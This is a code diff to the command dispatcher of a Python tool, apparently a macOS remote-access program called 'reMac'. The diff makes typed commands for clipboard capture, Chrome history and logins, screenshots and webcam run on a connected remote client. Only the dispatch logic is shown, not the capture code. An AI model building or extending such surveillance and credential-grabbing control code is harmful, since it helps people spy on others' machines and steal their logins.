@@ -70,6 +70,18 @@ def processInput(input):
     # if clientStarted == True:
     #     myreMac_client.start_client(input)
     #     return
+    inp_args = input.split(" ")
+
+    if len(inp_args) > 1:
+        if inp_args[0] == "s":
+            if len(inp_args) == 3:
+                myreMac_server.start_server(inp_args[1], inp_args[2])
+                return
+        elif inp_args[0] == "c":
+            if len(inp_args) == 3:
+                myreMac_client.start_client(inp_args[1], inp_args[2])
+                return
+
 
     if input == "q":# or input == "quit":
         sys.exit(1)
@@ -82,7 +94,7 @@ def processInput(input):
     elif input == "hh":  # or input == "help":
         print_client_help()
     elif input == "c":# or input == "help":
-        myreMac_client.start_client("mh")
+        myreMac_client.start_client()
         global clientStarted
         clientStarted = True
         # myreMac_client.start_client("mh")
@@ -90,20 +102,17 @@ def processInput(input):
         reMacModules[input][0].run_mod()
     elif input == "cb":# or input == "clipboard":
         if clientStarted == True:
-            myreMac_client.start_client("cb")
-            pass
+            myreMac_client.send2_client("cb")
         else:
             reMacModules[input][0].run_mod()
     elif input == "ch":# or input == "chromeHistory":
         if clientStarted == True:
-            myreMac_client.start_client(input)
-            pass
+            myreMac_client.send2_client(input)
         else:
             reMacModules[input][0].run_mod()
     elif input == "in":# or input == "chromeHistory":
         if clientStarted == True:
-            myreMac_client.start_client(input)
-            pass
+            myreMac_client.send2_client(input)
         else:
             reMacModules[input][0].run_mod()
     elif input == "cl":# or input == "chromeLogins":
@@ -113,26 +122,24 @@ def processInput(input):
     elif input == "sc":# or input == "screenshot":
         # reMacModules[input][0].run_mod()
         if clientStarted == True:
-            myreMac_client.start_client(input)
+            myreMac_client.send2_client(input)
             pass
         else:
             reMacModules[input][0].run_mod()
     elif input == "wc":# or input == "screenshot":
         if clientStarted == True:
-            myreMac_client.start_client(input)
+            myreMac_client.send2_client(input)
             pass
         else:
             reMacModules[input][0].run_mod()
     elif input == "rm":  # or input == "screenshot":
         if clientStarted == True:
-            myreMac_client.start_client(input)
-            pass
+            myreMac_client.send2_client(input)
         else:
             reMacModules["mh"][0].print_client_help(appName, reMacModules, input)
     elif input.startswith("mh"):  # or input == "screenshot":
         if clientStarted == True:
-            myreMac_client.start_client(input)
-            pass
+            myreMac_client.send2_client(input)
         else:
             reMacModules["mh"][0].print_client_help(appName, reMacModules, input)
     elif input == "d" or input == "dev":
